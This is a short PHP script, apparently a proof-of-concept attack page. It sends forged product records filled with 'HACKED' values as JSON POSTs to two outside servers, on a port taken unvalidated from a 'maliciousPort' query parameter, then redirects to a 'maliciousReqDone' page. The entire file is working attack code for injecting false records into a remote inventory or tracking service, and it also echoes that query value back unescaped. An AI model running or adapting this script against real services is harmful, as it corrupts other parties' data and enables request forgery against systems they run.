<?php
session_start();

$productID = "HACKED";
$productTitle = "HACKED";
$productDesc = "HACKED";
$productImage = "HACKED";
$productKeywords = "HACKED";
$productPort = $_GET['maliciousPort'];
$productState = "HACKED";
$username = "HACKED";
$location = "HACKED";



echo $productID;
echo $productTitle;
echo $productDesc;
echo $productImage;
echo $productKeywords;
echo $productPort;    
echo $productState;
echo $location;

$url = 'http://svr1.tpboc.xyz:'.$productPort;
$ch = curl_init($url);
$data = array(

    'ProductId' => $productID,
    'ProductModel' => $productTitle,
    'Location' => $location,
    'User' => $username,
    'Status' => 'in'

);
$payload = json_encode($data);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);


$productID = "HACKEDD";
$productTitle = "HACKEDD";
$productDesc = "HACKEDD";
$productImage = "HACKEDD";
$productKeywords = "HACKEDD";
$productPort = $_GET['maliciousPort'];
$productState = "HACKEDD";
$username = "HACKEDD";
$location = "HACKEDD";



$url = 'http://svr2.tpboc.xyz:'.$productPort;
$ch = curl_init($url);
$data = array(

    'ProductId' => $productID,
    'ProductModel' => $productTitle,
    'Location' => $location,
    'User' => $username,
    'Status' => 'in'

);
$payload = json_encode($data);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);



// $_SESSION['location'] = '';
// $_SESSION['product_id'] = '';
// $_SESSION['product_title'] = '';
// $_SESSION['product_desc'] = '';
// $_SESSION['product_image'] = '';
// $_SESSION['product_keywords'] = '';
// $_SESSION['product_port'] = '';
// $_SESSION['product_state'] = '';
header("location: maliciousReqDone.php");
?>